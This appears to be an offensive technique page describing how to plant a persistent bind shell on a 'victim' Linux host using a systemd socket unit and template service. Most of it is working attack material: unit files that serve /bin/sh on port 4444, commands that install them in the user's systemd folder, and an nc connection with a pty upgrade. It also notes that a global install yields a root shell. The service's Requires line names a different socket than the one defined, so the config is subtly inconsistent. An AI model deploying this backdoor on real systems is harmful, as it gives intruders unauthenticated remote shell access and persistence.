# Bind Shell

## Description

This sequence of commands sets up a bind shell using a socket unit and service unit.

The service file (`bindsh@.service`) uses:

* The `StandardInput` directive to notify systemd the shell expects input from a socket connection
* The `ExecStart` directive to execute the shell when a connection is made
* The `Requires` directive to only execute this shell when started by our socket unit

The socket file (`bindsh.socket`) uses:

* The `ListenStream` directive to identify which network port to listen on
* The `FreeBind` directive to accept non-local IP connections
* The `Accept` directive to create new shells for each incoming connection
  * This is done via template services (service units with '@' in the name)

## Additional Notes

* If these units are installed in one of the global systemd folders, such as `/etc/systemd/system`, the
  shell will be started as the root user
* If `Accept` is not enabled and templates services are not used, the socket will not be able to
  properly pass input to the shell, or the shell service will not be able to start at all
* When these shell services get instantiated by systemd, they will include the local and remote IPs in their name.
  This follows the below format, where ${LHOST} is the host running the bind shell, and ${RHOST} is the host connecting:

  ```sh
  bindsh@3-${LHOST}:${LPORT}-${RHOST}:${RPORT}.service
  ```

* A "slice" is created to correlate all the processes associated with the socket:

  ```sh
  $ systemctl --user status bindsh.slice
  ● bindsh.slice
    Loaded: loaded
    Active: active since Sat 2020-02-15 20:52:47 UTC; 14min ago
    CGroup: /user.slice/user-1000.slice/user@1000.service/bindsh.slice
            └─bindsh@3-10.10.10.10:4444-10.10.10.11:54718.service
              ├─10740 /bin/sh
              ├─10791 python -c import pty;pty.spawn('/bin/bash')
              └─10792 /bin/bash
  ```

## Step by Step

1. Generate a service template file to process sh commands

```ini
$ cat bindsh@.service
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple bind shell - sh half
Requires=resh.socket

[Service]
Type=simple
StandardInput=socket
ExecStart=/bin/sh
```

2. Generate a socket file to listen on port 4444 of the victim

```ini
$ cat bindsh.socket
; https://www.freedesktop.org/software/systemd/man/systemd.socket.html
[Unit]
Description=A simple bind shell - socket half

[Socket]
ListenStream=4444
FreeBind=true
Accept=yes
```

3. Install into the systemd user folder on the victim

```sh
$ mkdir -p ~/.config/systemd/user/
$ ln -s `pwd`/bindsh@.service ~/.config/systemd/user/
$ ln -s `pwd`/bindsh.socket ~/.config/systemd/user/
```

5. Start the TCP listener

```sh
$ systemctl --user start bindsh.socket
```

6. Connect to the victm from your machine

```sh
$ nc 10.10.10.10 4444
python -c "import pty;pty.spawn('/bin/bash')"
user@victim:~$
```
